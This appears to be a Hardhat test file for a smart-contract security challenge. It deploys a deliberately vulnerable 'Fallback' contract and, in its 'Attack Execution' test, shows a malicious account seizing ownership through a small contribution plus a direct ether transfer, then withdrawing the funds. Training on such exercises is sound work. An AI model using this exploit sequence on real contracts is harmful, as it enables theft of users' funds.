const { expect } = require("chai")
const { ethers } = require("hardhat");
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");

describe("Challenge 1 - Fallback", function() {

    async function deployContractFixture() {
        const [deployer, regularUser, maliciousUser] = await ethers.getSigners();
        const initialVictimFunds = "1000.0"

        const Fallback = await ethers.getContractFactory("Fallback")
        const vulnerableContract = await Fallback.deploy()
        await vulnerableContract.deployed()

        console.log(`contract deployed to ${vulnerableContract.address}`)

        return {initialVictimFunds, deployer, regularUser, maliciousUser, vulnerableContract}
    }

    describe("Initial State", function() {
        it("Should deploy with deployer address as owner", async function() {
            const {deployer, vulnerableContract} = await loadFixture(deployContractFixture)

            expect(vulnerableContract.deployTransaction.from).to.equal(deployer.address)
            expect(await vulnerableContract.owner()).is.equal(deployer.address)
        })

        it("Should assign all funds to victim", async function() {
            const {initialVictimFunds, vulnerableContract} = await loadFixture(deployContractFixture)

            expect(ethers.utils.formatEther(await vulnerableContract.getContribution())).to.equal(initialVictimFunds)
        })

        it("Should verify attacker is not owner", async function() {
            const {vulnerableContract, maliciousUser} = await loadFixture(deployContractFixture)

            expect(await vulnerableContract.owner()).not.equal(maliciousUser.address)
        })
    })

    describe("Regular Contract Usage", function () {
        it("Should record user contribution", async function() {
            const {regularUser, vulnerableContract} = await loadFixture(deployContractFixture)
            const tx = await vulnerableContract.connect(regularUser).contribute({value:ethers.utils.parseEther("0.0009")})
            await tx.wait()

            expect(await vulnerableContract.connect(regularUser).getContribution()).is.equal(ethers.utils.parseEther("0.0009"))
        })

        it("Should not change owner due to contribution size", async function() {
            const {deployer, regularUser, vulnerableContract} = await loadFixture(deployContractFixture)
            const tx = await vulnerableContract.connect(regularUser).contribute({value:ethers.utils.parseEther("0.0009")})
            await tx.wait()

            expect(await vulnerableContract.owner()).is.equal(deployer.address)
        })
    })

    describe("Attack Execution", function() {
        it("Should change ownership to attacker with small contribution", async function() {
            const {vulnerableContract, maliciousUser} = await loadFixture(deployContractFixture)
            const contributionValue = "0.00001"
            let tx = await vulnerableContract.connect(maliciousUser).contribute({value: ethers.utils.parseEther(contributionValue)})
            await tx.wait()

            const attackerContribution = await vulnerableContract.connect(maliciousUser).getContribution()
            expect(ethers.utils.formatEther(attackerContribution)).to.equal(contributionValue)

            tx = await maliciousUser.sendTransaction({to:vulnerableContract.address, value:ethers.utils.parseEther(contributionValue)})
            await tx.wait()

            tx = await vulnerableContract.connect(maliciousUser).withdraw()
            await tx.wait()

            expect(await vulnerableContract.owner()).is.equal(maliciousUser.address)
            await expect(vulnerableContract.withdraw()).to.be.revertedWith("caller is not the owner")
            await expect(vulnerableContract.connect(maliciousUser).withdraw()).not.to.be.reverted
        })
    })
})